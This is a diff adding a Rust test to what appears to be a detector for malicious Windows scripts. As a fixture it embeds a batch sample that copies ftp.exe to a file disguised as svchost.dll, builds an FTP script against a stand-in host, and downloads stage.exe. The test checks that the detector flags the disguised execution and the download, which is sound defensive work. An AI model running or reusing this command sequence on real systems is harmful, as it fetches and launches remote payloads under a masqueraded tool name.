@@ -13777,6 +13777,41 @@ start C:\Users\Public\stage.exe"#,
     }
 
     #[test]
+    fn copied_ftp_alias_script_file_emits_download() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\ftp.exe C:\Users\Public\svchost.dll
+echo open ftp-copied.example.net>f.scr
+echo lcd C:\Users\Public>>f.scr
+echo get stage.exe>>f.scr
+C:\Users\Public\svchost.dll -n -s:f.scr"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\svchost.dll"#
+                )
+            }),
+            "copied ftp alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-copied.example.net/stage.exe"
+                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
+                )
+            }),
+            "copied ftp alias script download was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ftp_current_dir_script_file_emits_remote_connect_and_download() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
